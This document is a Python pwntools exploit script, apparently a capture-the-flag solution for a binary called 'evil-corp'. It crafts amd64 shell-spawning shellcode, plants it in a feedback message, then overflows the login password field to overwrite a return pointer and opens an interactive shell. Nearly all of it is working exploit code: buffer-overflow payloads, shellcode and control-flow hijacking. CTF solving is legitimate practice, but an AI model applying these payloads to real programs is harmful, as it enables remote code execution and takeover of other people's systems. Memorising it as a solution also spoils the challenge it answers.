import pathlib

from pwn import *

from utils.target import start

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
parent_dir = pathlib.Path(__file__).parent
exe = parent_dir / 'evil-corp'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

unicode_null = '\U00000000'

shellcode = asm(shellcraft.amd64.linux.sh()).decode('utf-16')
support_message_payload = (('A' * 0x800) + shellcode + '\U00000011' + unicode_null).encode('utf-8')

login_payload = (('!' * 0x56) + p64(0x11000).decode('utf-32') + unicode_null).encode('utf-8')

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start(exe=str(exe), gdb_script=gdb_script)

# Initial login
info('Logging in...')
io.sendlineafter(b'Username: ', b'eliot')
io.sendlineafter(b'Password: ', b'4007')

# Send feedback containing the base address or ROP chain
info('Storing hijacked return pointer to ROP chain in feedback...')
io.sendlineafter(b'>> ', b'2')
io.sendlineafter(b'\n\n', support_message_payload)

# Logout
info('Logging out...')
io.sendlineafter(b'>> ', b'3')

# Log back in but hijack the return pointer
info('Logging in with overflow payload...')
io.sendlineafter(b'Username: ', b'not eliot')
io.sendlineafter(b'Password: ', login_payload)
io.recvuntil('抱歉，请重试或致电系统管理员。\n'.encode('utf-8'))

success('Welcome to your shell, Eliot.')
io.interactive()
